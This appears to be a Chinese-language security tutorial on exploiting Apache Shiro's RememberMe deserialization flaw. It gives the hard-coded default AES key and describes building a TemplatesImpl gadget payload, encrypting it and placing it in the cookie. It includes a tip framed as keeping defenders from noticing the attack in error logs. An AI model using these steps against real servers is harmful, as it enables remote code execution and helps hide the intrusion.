Shiro反序列化之CCK1

简介

shiro不同于Tomcat，SpringBoot这类web框架，shiro是一个安全框架，其实shiro反序列化在我们学习了cc1和cc6之后是很简单的，它的漏洞成因和它的安全机制有关

漏洞原理

这里先来讲解一下shiro的安全机制，它一共有四个功能：

1.认证

2.授权

3.会话管理

4.加密

上述的这几个机制当中，出现问题的就是会话管理这个环节了，为了保存用户的登录信息，shiro加入了RemeberMe功能，这个功能是存在于cookie当中的，而该功能生成cookie的流程也很简单：
首先会将用户信息进行序列化然后进行AES加密，最后进行base64编码

那么反过来服务器端解析就是先base64解码然后再AES解密最后再反序列化，但是shiro官方在1.2.4版本之前内置了一个默认且固定的AES加密Key，其值为：
kPH+bIxk5D2deZiIxcaaaA==

那么这里就出现了我们的漏洞点了，既然我们知道了加密的密钥，那我们完全可以把恶意代码写了之后根据密钥加密塞进cookie里面进行请求，那这样就实现了我们的攻击

在 TemplatesImpl 的底层源码跑到最后一步（准备收尾返回对象）时，会去调用 _tfactory 里的方法。如果我们不提前给它塞个值，它默认就是 null。

Java 程序一旦碰到 null 还会硬调它的方法，当场就会引发空指针异常（NullPointerException）。这会导致两个致命后果：

  1. 链子断裂：程序直接崩溃，反序列化流程无法平稳走完，容易产生不可控的意外。
  2. 打草惊蛇：目标服务器的后台会瞬间弹出一大片报错堆栈日志。防守方（蓝队）只要一查日志，立刻就能发现有人在搞反序列化攻击。

所以，我们随便塞一个没有任何毒性的官方正常对象（TransformerFactoryImpl）进去“凑数”。这就好比给安检程序塞个占位符，纯粹是为了堵住底层源码的嘴，让程序安安静静、平平稳稳地跑完全程，不留下任何显眼的报错痕迹。

AesCipherService aes = new AesCipherService();这一句是引用shiro源码框架当中的类，相当于我们这里引入了一个shiro官方的加密器

这一句是将key还原

底层原理解析： 把原始炸弹（payload）和万能钥匙（key）丢进加密器。

这里的极度核心细节：Shiro 使用的加密模式是 AES-CBC。密码学中，CBC 模式为了防止同样的明文每次加密出同样的密文，必须在开头加上一段 16 字节的随机数，叫做 IV（初始化向量）。

当你调用 aes.encrypt() 时，这个方法内部全自动帮你做好了三件事：

  1. 随机生成了一段 16 字节的 IV。
  2. 用 key 和 IV 将你的 payload 加密。
  3. 把这段 IV，直接拼接在加密后的密文最前面！ （这非常重要，因为受害者服务器收到数据时，也会先切下前 16 个字节作为 IV 去解密后半部分）。

最终返回的 ciphertext，就是一个包含 [16字节随机IV + AES密文] 的完整数据包。

System.out.printf(“rememberMe=” + ciphertext.toString());这一句就是把我们构造好的数据打印出来，我们直接拿着打印得到的数据去发包时替换掉RememberMe字段里面的内容就可以了
